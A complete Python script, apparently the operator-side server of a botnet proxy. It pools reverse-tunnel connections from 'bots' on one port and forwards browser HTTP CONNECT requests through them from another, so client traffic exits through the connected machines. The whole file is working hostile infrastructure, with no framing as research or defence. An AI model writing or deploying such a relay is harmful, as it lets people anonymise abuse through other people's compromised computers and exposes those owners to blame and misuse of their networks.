import socket
import threading
import struct
import select
from collections import deque

REVERSE_PROXY_HOST = '0.0.0.0'
REVERSE_PROXY_PORT = 8080  # For reverse connections from ProxyModule
FORWARD_PROXY_PORT = 8081  # For regular proxy connections from browsers

class TunnelManager:
    def __init__(self):
        self.available_bots = deque()
        self.lock = threading.Lock()
    
    def add_bot(self, bot_sock):
        with self.lock:
            self.available_bots.append(bot_sock)
            print(f"[+] Bot connected. Total bots: {len(self.available_bots)}")
    
    def get_bot(self):
        with self.lock:
            if not self.available_bots:
                return None
            return self.available_bots.popleft()
    
    def return_bot(self, bot_sock):
        with self.lock:
            self.available_bots.append(bot_sock)

tunnel_manager = TunnelManager()

def handle_bot_connection(bot_sock, addr):
    print(f"[+] Reverse tunnel connection from {addr}")
    tunnel_manager.add_bot(bot_sock)

def handle_client_connection(client_sock, addr):
    print(f"[+] Client connection from {addr}")
    
    # Get an available bot connection
    bot_sock = tunnel_manager.get_bot()
    if not bot_sock:
        print("[-] No available bots to handle request")
        client_sock.close()
        return
    
    try:
        # Read HTTP CONNECT request (simplified)
        request = client_sock.recv(4096)
        if not request:
            raise Exception("Empty request")
        
        # Parse target from CONNECT request
        lines = request.decode().split('\r\n')
        connect_line = lines[0]
        if not connect_line.startswith('CONNECT '):
            raise Exception("Not a CONNECT request")
        
        target = connect_line.split(' ')[1]
        target_host, target_port = target.split(':')
        target_port = int(target_port)
        
        # Send target info to bot
        addr_len = len(target_host)
        header = struct.pack('!BBH', 0x01, addr_len, target_port)
        bot_sock.sendall(header)
        bot_sock.sendall(target_host.encode())
        
        # Send HTTP 200 OK to client
        client_sock.sendall(b"HTTP/1.1 200 Connection Established\r\n\r\n")
        
        # Start bidirectional forwarding
        def forward(src, dst):
            try:
                while True:
                    data = src.recv(4096)
                    if not data:
                        break
                    dst.sendall(data)
            except Exception as e:
                print(f"[!] Forwarding error: {e}")
            finally:
                src.close()
                dst.close()
        
        threading.Thread(target=forward, args=(client_sock, bot_sock), daemon=True).start()
        threading.Thread(target=forward, args=(bot_sock, client_sock), daemon=True).start()
        
    except Exception as e:
        print(f"[!] Error handling client: {e}")
        client_sock.close()
        tunnel_manager.return_bot(bot_sock)

def start_reverse_proxy_server():
    # Server for reverse connections from bots
    bot_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    bot_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    bot_server.bind((REVERSE_PROXY_HOST, REVERSE_PROXY_PORT))
    bot_server.listen(5)
    print(f"[*] Listening for bot connections on {REVERSE_PROXY_HOST}:{REVERSE_PROXY_PORT}")
    
    # Server for forward proxy connections
    client_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    client_server.bind((REVERSE_PROXY_HOST, FORWARD_PROXY_PORT))
    client_server.listen(5)
    print(f"[*] Forward proxy listening on {REVERSE_PROXY_HOST}:{FORWARD_PROXY_PORT}")
    
    def accept_connections(server, handler):
        while True:
            conn, addr = server.accept()
            threading.Thread(target=handler, args=(conn, addr), daemon=True).start()
    
    # Start both acceptors
    threading.Thread(target=accept_connections, args=(bot_server, handle_bot_connection), daemon=True).start()
    threading.Thread(target=accept_connections, args=(client_server, handle_client_connection), daemon=True).start()
    
    # Keep main thread alive
    while True:
        pass

if __name__ == "__main__":
    start_reverse_proxy_server()